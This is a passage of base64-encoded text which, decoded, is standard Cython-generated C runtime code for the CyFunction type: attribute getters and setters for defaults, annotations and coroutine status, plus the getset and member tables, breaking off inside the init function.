+ZGVmYXVsdHNfdHVwbGUgPSBfX1B5eF9QeVNlcXVlbmNlX0lURU0ocmVzLCAwKTtcbiAgICBpZiAodW5saWtlbHkoIW9wLT5kZWZhdWx0c190dXBsZSkpIHJlc3VsdCA9IC0xO1xuICAgIGVsc2Uge1xuICAgICAgICBvcC0+ZGVmYXVsdHNfa3dkaWN0ID0gX19QeXhfUHlTZXF1ZW5jZV9JVEVNKHJlcywgMSk7XG4gICAgICAgIGlmICh1bmxpa2VseSghb3AtPmRlZmF1bHRzX2t3ZGljdCkpIHJlc3VsdCA9IC0xO1xuICAgIH1cbiAgICAjZW5kaWZcbiAgICBQeV9ERUNSRUYocmVzKTtcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuc3RhdGljIGludFxuX19QeXhfQ3lGdW5jdGlvbl9zZXRfZGVmYXVsdHMoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIFB5T2JqZWN0KiB2YWx1ZSwgdm9pZCAqY29udGV4dCkge1xuICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpO1xuICAgIGlmICghdmFsdWUpIHtcbiAgICAgICAgdmFsdWUgPSBQeV9Ob25lO1xuICAgIH0gZWxzZSBpZiAodW5saWtlbHkodmFsdWUgIT0gUHlfTm9uZSAmJiAhUHlUdXBsZV9DaGVjayh2YWx1ZSkpKSB7XG4gICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICAgICAgICAgICAgICAgICAiX19kZWZhdWx0c19fIG11c3QgYmUgc2V0IHRvIGEgdHVwbGUgb2JqZWN0Iik7XG4gICAgICAgIHJldHVybiAtMTtcbiAgICB9XG4gICAgUHlFcnJfV2FybkV4KFB5RXhjX1J1bnRpbWVXYXJuaW5nLCAiY2hhbmdlcyB0byBjeWZ1bmN0aW9uLl9fZGVmYXVsdHNfXyB3aWxsIG5vdCAiXG4gICAgICAgICAgICAgICAgICJjdXJyZW50bHkgYWZmZWN0IHRoZSB2YWx1ZXMgdXNlZCBpbiBmdW5jdGlvbiBjYWxscyIsIDEpO1xuICAgIFB5X0lOQ1JFRih2YWx1ZSk7XG4gICAgX19QeXhfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihvcCk7XG4gICAgX19QeXhfUHlfWERFQ1JFRl9TRVQob3AtPmRlZmF1bHRzX3R1cGxlLCB2YWx1ZSk7XG4gICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTtcbiAgICByZXR1cm4gMDtcbn1cbnN0YXRpYyBQeU9iamVjdCAqXG5fX1B5eF9DeUZ1bmN0aW9uX2dldF9kZWZhdWx0c19sb2NrZWQoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3ApIHtcbiAgICBQeU9iamVjdCogcmVzdWx0ID0gb3AtPmRlZmF1bHRzX3R1cGxlO1xuICAgIGlmICh1bmxpa2VseSghcmVzdWx0KSkge1xuICAgICAgICBpZiAob3AtPmRlZmF1bHRzX2dldHRlcikge1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KF9fUHl4X0N5RnVuY3Rpb25faW5pdF9kZWZhdWx0cyhvcCkgPCAwKSkgcmV0dXJuIE5VTEw7XG4gICAgICAgICAgICByZXN1bHQgPSBvcC0+ZGVmYXVsdHNfdHVwbGU7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICByZXN1bHQgPSBQeV9Ob25lO1xuICAgICAgICB9XG4gICAgfVxuICAgIFB5X0lOQ1JFRihyZXN1bHQpO1xuICAgIHJldHVybiByZXN1bHQ7XG59XG5zdGF0aWMgUHlPYmplY3QgKlxuX19QeXhfQ3lGdW5jdGlvbl9nZXRfZGVmYXVsdHMoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIHZvaWQgKmNvbnRleHQpIHtcbiAgICBQeU9iamVjdCogcmVzdWx0ID0gTlVMTDtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTtcbiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTtcbiAgICByZXN1bHQgPSBfX1B5eF9DeUZ1bmN0aW9uX2dldF9kZWZhdWx0c19sb2NrZWQob3ApO1xuICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbnN0YXRpYyBpbnRcbl9fUHl4X0N5RnVuY3Rpb25fc2V0X2t3ZGVmYXVsdHMoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIFB5T2JqZWN0KiB2YWx1ZSwgdm9pZCAqY29udGV4dCkge1xuICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpO1xuICAgIGlmICghdmFsdWUpIHtcbiAgICAgICAgdmFsdWUgPSBQeV9Ob25lO1xuICAgIH0gZWxzZSBpZiAodW5saWtlbHkodmFsdWUgIT0gUHlfTm9uZSAmJiAhUHlEaWN0X0NoZWNrKHZhbHVlKSkpIHtcbiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1R5cGVFcnJvcixcbiAgICAgICAgICAgICAgICAgICAgICAgICJfX2t3ZGVmYXVsdHNfXyBtdXN0IGJlIHNldCB0byBhIGRpY3Qgb2JqZWN0Iik7XG4gICAgICAgIHJldHVybiAtMTtcbiAgICB9XG4gICAgUHlFcnJfV2FybkV4KFB5RXhjX1J1bnRpbWVXYXJuaW5nLCAiY2hhbmdlcyB0byBjeWZ1bmN0aW9uLl9fa3dkZWZhdWx0c19fIHdpbGwgbm90ICJcbiAgICAgICAgICAgICAgICAgImN1cnJlbnRseSBhZmZlY3QgdGhlIHZhbHVlcyB1c2VkIGluIGZ1bmN0aW9uIGNhbGxzIiwgMSk7XG4gICAgUHlfSU5DUkVGKHZhbHVlKTtcbiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTtcbiAgICBfX1B5eF9QeV9YREVDUkVGX1NFVChvcC0+ZGVmYXVsdHNfa3dkaWN0LCB2YWx1ZSk7XG4gICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTtcbiAgICByZXR1cm4gMDtcbn1cbnN0YXRpYyBQeU9iamVjdCAqXG5fX1B5eF9DeUZ1bmN0aW9uX2dldF9rd2RlZmF1bHRzX2xvY2tlZChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCkge1xuICAgIFB5T2JqZWN0KiByZXN1bHQgPSBvcC0+ZGVmYXVsdHNfa3dkaWN0O1xuICAgIGlmICh1bmxpa2VseSghcmVzdWx0KSkge1xuICAgICAgICBpZiAob3AtPmRlZmF1bHRzX2dldHRlcikge1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KF9fUHl4X0N5RnVuY3Rpb25faW5pdF9kZWZhdWx0cyhvcCkgPCAwKSkgcmV0dXJuIE5VTEw7XG4gICAgICAgICAgICByZXN1bHQgPSBvcC0+ZGVmYXVsdHNfa3dkaWN0O1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgcmVzdWx0ID0gUHlfTm9uZTtcbiAgICAgICAgfVxuICAgIH1cbiAgICBQeV9JTkNSRUYocmVzdWx0KTtcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuc3RhdGljIFB5T2JqZWN0ICpcbl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2t3ZGVmYXVsdHMoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIHZvaWQgKmNvbnRleHQpIHtcbiAgICBQeU9iamVjdCogcmVzdWx0O1xuICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpO1xuICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04ob3ApO1xuICAgIHJlc3VsdCA9IF9fUHl4X0N5RnVuY3Rpb25fZ2V0X2t3ZGVmYXVsdHNfbG9ja2VkKG9wKTtcbiAgICBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpO1xuICAgIHJldHVybiByZXN1bHQ7XG59XG5zdGF0aWMgaW50XG5fX1B5eF9DeUZ1bmN0aW9uX3NldF9hbm5vdGF0aW9ucyhfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgUHlPYmplY3QqIHZhbHVlLCB2b2lkICpjb250ZXh0KSB7XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7XG4gICAgaWYgKCF2YWx1ZSB8fCB2YWx1ZSA9PSBQeV9Ob25lKSB7XG4gICAgICAgIHZhbHVlID0gTlVMTDtcbiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KCFQeURpY3RfQ2hlY2sodmFsdWUpKSkge1xuICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAgICAgICAgICAgICAgICAgIl9fYW5ub3RhdGlvbnNfXyBtdXN0IGJlIHNldCB0byBhIGRpY3Qgb2JqZWN0Iik7XG4gICAgICAgIHJldHVybiAtMTtcbiAgICB9XG4gICAgUHlfWElOQ1JFRih2YWx1ZSk7XG4gICAgX19QeXhfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihvcCk7XG4gICAgX19QeXhfUHlfWERFQ1JFRl9TRVQob3AtPmZ1bmNfYW5ub3RhdGlvbnMsIHZhbHVlKTtcbiAgICBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpO1xuICAgIHJldHVybiAwO1xufVxuc3RhdGljIFB5T2JqZWN0ICpcbl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2Fubm90YXRpb25zX2xvY2tlZChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCkge1xuICAgIFB5T2JqZWN0KiByZXN1bHQgPSBvcC0+ZnVuY19hbm5vdGF0aW9ucztcbiAgICBpZiAodW5saWtlbHkoIXJlc3VsdCkpIHtcbiAgICAgICAgcmVzdWx0ID0gUHlEaWN0X05ldygpO1xuICAgICAgICBpZiAodW5saWtlbHkoIXJlc3VsdCkpIHJldHVybiBOVUxMO1xuICAgICAgICBvcC0+ZnVuY19hbm5vdGF0aW9ucyA9IHJlc3VsdDtcbiAgICB9XG4gICAgUHlfSU5DUkVGKHJlc3VsdCk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbnN0YXRpYyBQeU9iamVjdCAqXG5fX1B5eF9DeUZ1bmN0aW9uX2dldF9hbm5vdGF0aW9ucyhfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgdm9pZCAqY29udGV4dCkge1xuICAgIFB5T2JqZWN0ICpyZXN1bHQ7XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7XG4gICAgX19QeXhfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihvcCk7XG4gICAgcmVzdWx0ID0gX19QeXhfQ3lGdW5jdGlvbl9nZXRfYW5ub3RhdGlvbnNfbG9ja2VkKG9wKTtcbiAgICBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpO1xuICAgIHJldHVybiByZXN1bHQ7XG59XG5zdGF0aWMgUHlPYmplY3QgKlxuX19QeXhfQ3lGdW5jdGlvbl9nZXRfaXNfY29yb3V0aW5lX3ZhbHVlKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wKSB7XG4gICAgaW50IGlzX2Nvcm91dGluZSA9IG9wLT5mbGFncyAmIF9fUHl4X0NZRlVOQ1RJT05fQ09ST1VUSU5FO1xuICAgIGlmIChpc19jb3JvdXRpbmUpIHtcbiAgICAgICAgUHlPYmplY3QgKmlzX2Nvcm91dGluZV92YWx1ZSwgKm1vZHVsZSwgKmZyb21saXN0LCAqbWFya2VyID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2lzX2Nvcm91dGluZTtcbiAgICAgICAgZnJvbWxpc3QgPSBQeUxpc3RfTmV3KDEpO1xuICAgICAgICBpZiAodW5saWtlbHkoIWZyb21saXN0KSkgcmV0dXJuIE5VTEw7XG4gICAgICAgIFB5X0lOQ1JFRihtYXJrZXIpO1xuI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1NcbiAgICAgICAgUHlMaXN0X1NFVF9JVEVNKGZyb21saXN0LCAwLCBtYXJrZXIpO1xuI2Vsc2VcbiAgICAgICAgaWYgKHVubGlrZWx5KFB5TGlzdF9TZXRJdGVtKGZyb21saXN0LCAwLCBtYXJrZXIpIDwgMCkpIHtcbiAgICAgICAgICAgIFB5X0RFQ1JFRihtYXJrZXIpO1xuICAgICAgICAgICAgUHlfREVDUkVGKGZyb21saXN0KTtcbiAgICAgICAgICAgIHJldHVybiBOVUxMO1xuICAgICAgICB9XG4jZW5kaWZcbiAgICAgICAgbW9kdWxlID0gUHlJbXBvcnRfSW1wb3J0TW9kdWxlTGV2ZWxPYmplY3QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2FzeW5jaW9fY29yb3V0aW5lcywgTlVMTCwgTlVMTCwgZnJvbWxpc3QsIDApO1xuICAgICAgICBQeV9ERUNSRUYoZnJvbWxpc3QpO1xuICAgICAgICBpZiAodW5saWtlbHkoIW1vZHVsZSkpIGdvdG8gaWdub3JlO1xuICAgICAgICBpc19jb3JvdXRpbmVfdmFsdWUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKG1vZHVsZSwgbWFya2VyKTtcbiAgICAgICAgUHlfREVDUkVGKG1vZHVsZSk7XG4gICAgICAgIGlmIChsaWtlbHkoaXNfY29yb3V0aW5lX3ZhbHVlKSkge1xuICAgICAgICAgICAgcmV0dXJuIGlzX2Nvcm91dGluZV92YWx1ZTtcbiAgICAgICAgfVxuaWdub3JlOlxuICAgICAgICBQeUVycl9DbGVhcigpO1xuICAgIH1cbiAgICByZXR1cm4gX19QeXhfUHlCb29sX0Zyb21Mb25nKGlzX2Nvcm91dGluZSk7XG59XG5zdGF0aWMgUHlPYmplY3QgKlxuX19QeXhfQ3lGdW5jdGlvbl9nZXRfaXNfY29yb3V0aW5lKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCB2b2lkICpjb250ZXh0KSB7XG4gICAgUHlPYmplY3QgKnJlc3VsdDtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTtcbiAgICBpZiAob3AtPmZ1bmNfaXNfY29yb3V0aW5lKSB7XG4gICAgICAgIHJldHVybiBfX1B5eF9OZXdSZWYob3AtPmZ1bmNfaXNfY29yb3V0aW5lKTtcbiAgICB9XG4gICAgcmVzdWx0ID0gX19QeXhfQ3lGdW5jdGlvbl9nZXRfaXNfY29yb3V0aW5lX3ZhbHVlKG9wKTtcbiAgICBpZiAodW5saWtlbHkoIXJlc3VsdCkpXG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04ob3ApO1xuICAgIGlmIChvcC0+ZnVuY19pc19jb3JvdXRpbmUpIHtcbiAgICAgICAgUHlfREVDUkVGKHJlc3VsdCk7XG4gICAgICAgIHJlc3VsdCA9IF9fUHl4X05ld1JlZihvcC0+ZnVuY19pc19jb3JvdXRpbmUpO1xuICAgIH0gZWxzZSB7XG4gICAgICAgIG9wLT5mdW5jX2lzX2Nvcm91dGluZSA9IF9fUHl4X05ld1JlZihyZXN1bHQpO1xuICAgIH1cbiAgICBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpO1xuICAgIHJldHVybiByZXN1bHQ7XG59XG5zdGF0aWMgdm9pZCBfX1B5eF9DeUZ1bmN0aW9uX3JhaXNlX2FyZ3VtZW50X2NvdW50X2Vycm9yKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKmZ1bmMsIGNvbnN0IGNoYXIqIG1lc3NhZ2UsIFB5X3NzaXplX3Qgc2l6ZSkge1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBQeU9iamVjdCAqcHlfbmFtZSA9IF9fUHl4X0N5RnVuY3Rpb25fZ2V0X25hbWUoZnVuYywgTlVMTCk7XG4gICAgaWYgKCFweV9uYW1lKSByZXR1cm47XG4gICAgUHlFcnJfRm9ybWF0KFB5RXhjX1R5cGVFcnJvcixcbiAgICAgICAgIiUuMjAwUygpICVzICglIiBDWVRIT05fRk9STUFUX1NTSVpFX1QgImQgZ2l2ZW4pIixcbiAgICAgICAgcHlfbmFtZSwgbWVzc2FnZSwgc2l6ZSk7XG4gICAgUHlfREVDUkVGKHB5X25hbWUpO1xuI2Vsc2VcbiAgICBjb25zdCBjaGFyKiBuYW1lID0gKChQeUNGdW5jdGlvbk9iamVjdCopZnVuYyktPm1fbWwtPm1sX25hbWU7XG4gICAgUHlFcnJfRm9ybWF0KFB5RXhjX1R5cGVFcnJvcixcbiAgICAgICAgIiUuMjAwcygpICVzICglIiBDWVRIT05fRk9STUFUX1NTSVpFX1QgImQgZ2l2ZW4pIixcbiAgICAgICAgbmFtZSwgbWVzc2FnZSwgc2l6ZSk7XG4jZW5kaWZcbn1cbnN0YXRpYyB2b2lkIF9fUHl4X0N5RnVuY3Rpb25fcmFpc2VfdHlwZV9lcnJvcihfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpmdW5jLCBjb25zdCBjaGFyKiBtZXNzYWdlKSB7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIFB5T2JqZWN0ICpweV9uYW1lID0gX19QeXhfQ3lGdW5jdGlvbl9nZXRfbmFtZShmdW5jLCBOVUxMKTtcbiAgICBpZiAoIXB5X25hbWUpIHJldHVybjtcbiAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAiJS4yMDBTKCkgJXMiLFxuICAgICAgICBweV9uYW1lLCBtZXNzYWdlKTtcbiAgICBQeV9ERUNSRUYocHlfbmFtZSk7XG4jZWxzZVxuICAgIGNvbnN0IGNoYXIqIG5hbWUgPSAoKFB5Q0Z1bmN0aW9uT2JqZWN0KilmdW5jKS0+bV9tbC0+bWxfbmFtZTtcbiAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAiJS4yMDBzKCkgJXMiLFxuICAgICAgICBuYW1lLCBtZXNzYWdlKTtcbiNlbmRpZlxufVxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbnN0YXRpYyBQeU9iamVjdCAqXG5fX1B5eF9DeUZ1bmN0aW9uX2dldF9tb2R1bGUoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIHZvaWQgKmNvbnRleHQpIHtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTtcbiAgICByZXR1cm4gUHlPYmplY3RfR2V0QXR0clN0cmluZyhvcC0+ZnVuYywgIl9fbW9kdWxlX18iKTtcbn1cbnN0YXRpYyBpbnRcbl9fUHl4X0N5RnVuY3Rpb25fc2V0X21vZHVsZShfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgUHlPYmplY3QqIHZhbHVlLCB2b2lkICpjb250ZXh0KSB7XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7XG4gICAgcmV0dXJuIFB5T2JqZWN0X1NldEF0dHJTdHJpbmcob3AtPmZ1bmMsICJfX21vZHVsZV9fIiwgdmFsdWUpO1xufVxuI2VuZGlmXG5zdGF0aWMgUHlHZXRTZXREZWYgX19weXhfQ3lGdW5jdGlvbl9nZXRzZXRzW10gPSB7XG4gICAgeyJmdW5jX2RvYyIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfZG9jLCAoc2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fc2V0X2RvYywgMCwgMH0sXG4gICAgeyJfX2RvY19fIiwgIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfZG9jLCAoc2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fc2V0X2RvYywgMCwgMH0sXG4gICAgeyJmdW5jX25hbWUiLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X25hbWUsIChzZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9zZXRfbmFtZSwgMCwgMH0sXG4gICAgeyJfX25hbWVfXyIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfbmFtZSwgKHNldHRlcilfX1B5eF9DeUZ1bmN0aW9uX3NldF9uYW1lLCAwLCAwfSxcbiAgICB7Il9fcXVhbG5hbWVfXyIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfcXVhbG5hbWUsIChzZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9zZXRfcXVhbG5hbWUsIDAsIDB9LFxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwQTAwMDBcbiAgICB7ImZ1bmNfZGljdCIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfZGljdCwgKHNldHRlcilQeU9iamVjdF9HZW5lcmljU2V0RGljdCwgMCwgMH0sXG4gICAgeyJfX2RpY3RfXyIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfZGljdCwgKHNldHRlcilQeU9iamVjdF9HZW5lcmljU2V0RGljdCwgMCwgMH0sXG4jZWxzZVxuICAgIHsiZnVuY19kaWN0IiwgKGdldHRlcilQeU9iamVjdF9HZW5lcmljR2V0RGljdCwgKHNldHRlcilQeU9iamVjdF9HZW5lcmljU2V0RGljdCwgMCwgMH0sXG4gICAgeyJfX2RpY3RfXyIsIChnZXR0ZXIpUHlPYmplY3RfR2VuZXJpY0dldERpY3QsIChzZXR0ZXIpUHlPYmplY3RfR2VuZXJpY1NldERpY3QsIDAsIDB9LFxuI2VuZGlmXG4gICAgeyJmdW5jX2dsb2JhbHMiLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X2dsb2JhbHMsIDAsIDAsIDB9LFxuICAgIHsiX19nbG9iYWxzX18iLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X2dsb2JhbHMsIDAsIDAsIDB9LFxuICAgIHsiZnVuY19jbG9zdXJlIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9jbG9zdXJlLCAwLCAwLCAwfSxcbiAgICB7Il9fY2xvc3VyZV9fIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9jbG9zdXJlLCAwLCAwLCAwfSxcbiAgICB7ImZ1bmNfY29kZSIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfY29kZSwgMCwgMCwgMH0sXG4gICAgeyJfX2NvZGVfXyIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfY29kZSwgMCwgMCwgMH0sXG4gICAgeyJmdW5jX2RlZmF1bHRzIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9kZWZhdWx0cywgKHNldHRlcilfX1B5eF9DeUZ1bmN0aW9uX3NldF9kZWZhdWx0cywgMCwgMH0sXG4gICAgeyJfX2RlZmF1bHRzX18iLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X2RlZmF1bHRzLCAoc2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fc2V0X2RlZmF1bHRzLCAwLCAwfSxcbiAgICB7Il9fa3dkZWZhdWx0c19fIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9rd2RlZmF1bHRzLCAoc2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fc2V0X2t3ZGVmYXVsdHMsIDAsIDB9LFxuICAgIHsiX19hbm5vdGF0aW9uc19fIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9hbm5vdGF0aW9ucywgKHNldHRlcilfX1B5eF9DeUZ1bmN0aW9uX3NldF9hbm5vdGF0aW9ucywgMCwgMH0sXG4gICAgeyJfaXNfY29yb3V0aW5lIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9pc19jb3JvdXRpbmUsIDAsIDAsIDB9LFxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICB7Il9fbW9kdWxlX18iLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X21vZHVsZSwgKHNldHRlcilfX1B5eF9DeUZ1bmN0aW9uX3NldF9tb2R1bGUsIDAsIDB9LFxuI2VuZGlmXG4gICAgezAsIDAsIDAsIDAsIDB9XG59O1xuc3RhdGljIFB5TWVtYmVyRGVmIF9fcHl4X0N5RnVuY3Rpb25fbWVtYmVyc1tdID0ge1xuI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgeyJfX21vZHVsZV9fIiwgVF9PQkpFQ1QsIG9mZnNldG9mKFB5Q0Z1bmN0aW9uT2JqZWN0LCBtX21vZHVsZSksIDAsIDB9LFxuI2VuZGlmXG4jaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMEMwMDAwIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICB7Il9fZGljdG9mZnNldF9fIiwgVF9QWVNTSVpFVCwgb2Zmc2V0b2YoX19weXhfQ3lGdW5jdGlvbk9iamVjdCwgZnVuY19kaWN0KSwgUkVBRE9OTFksIDB9LFxuI2VuZGlmXG4jaWYgQ1lUSE9OX01FVEhfRkFTVENBTExcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgeyJfX3ZlY3RvcmNhbGxvZmZzZXRfXyIsIFRfUFlTU0laRVQsIG9mZnNldG9mKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QsIGZ1bmNfdmVjdG9yY2FsbCksIFJFQURPTkxZLCAwfSxcbiNlbHNlXG4gICAgeyJfX3ZlY3RvcmNhbGxvZmZzZXRfXyIsIFRfUFlTU0laRVQsIG9mZnNldG9mKFB5Q0Z1bmN0aW9uT2JqZWN0LCB2ZWN0b3JjYWxsKSwgUkVBRE9OTFksIDB9LFxuI2VuZGlmXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIHsiX193ZWFrbGlzdG9mZnNldF9fIiwgVF9QWVNTSVpFVCwgb2Zmc2V0b2YoX19weXhfQ3lGdW5jdGlvbk9iamVjdCwgZnVuY193ZWFrcmVmbGlzdCksIFJFQURPTkxZLCAwfSxcbiNlbHNlXG4gICAgeyJfX3dlYWtsaXN0b2Zmc2V0X18iLCBUX1BZU1NJWkVULCBvZmZzZXRvZihQeUNGdW5jdGlvbk9iamVjdCwgbV93ZWFrcmVmbGlzdCksIFJFQURPTkxZLCAwfSxcbiNlbmRpZlxuI2VuZGlmXG4gICAgezAsIDAsIDAsICAwLCAwfVxufTtcbnN0YXRpYyBQeU9iamVjdCAqXG5fX1B5eF9DeUZ1bmN0aW9uX3JlZHVjZShfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICptLCBQeU9iamVjdCAqYXJncylcbntcbiAgICBQeU9iamVjdCAqcmVzdWx0ID0gTlVMTDtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihhcmdzKTtcbiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG0pO1xuICAgIFB5X0lOQ1JFRihtLT5mdW5jX3F1YWxuYW1lKTtcbiAgICByZXN1bHQgPSBtLT5mdW5jX3F1YWxuYW1lO1xuICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbnN0YXRpYyBQeU1ldGhvZERlZiBfX3B5eF9DeUZ1bmN0aW9uX21ldGhvZHNbXSA9IHtcbiAgICB7Il9fcmVkdWNlX18iLCAoUHlDRnVuY3Rpb24pX19QeXhfQ3lGdW5jdGlvbl9yZWR1Y2UsIE1FVEhfVkFSQVJHUywgMH0sXG4gICAgezAsIDAsIDAsIDB9XG59O1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiNkZWZpbmUgX19QeXhfQ3lGdW5jdGlvbl93ZWFrcmVmbGlzdChjeWZ1bmMpICgoY3lmdW5jKS0+ZnVuY193ZWFrcmVmbGlzdClcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X0N5RnVuY3Rpb25fd2Vha3JlZmxpc3QoY3lmdW5jKSAoKChQeUNGdW5jdGlvbk9iamVjdCopY3lmdW5jKS0+bV93ZWFrcmVmbGlzdClcbiNlbmRpZlxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9DeUZ1bmN0aW9uX0luaXQoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIFB5TWV0aG9kRGVmICptbCwgaW50IGZsYWdzLCBQeU9iamVjdCogcXVhbG5hbWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqY2xvc3VyZSwgUHlPYmplY3QgKm1vZHVsZSwgUHlPYmplY3QqIGdsb2JhbHMsIFB5T2JqZWN0KiBjb2RlKSB7XG4jaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBQeUNGdW5jdGlvbk9iamVjdCAqY2YgPSAoUHlDRnVuY3Rpb25PYmplY3QqKSBvcDtcbiNlbmRpZlxuICAgIGlm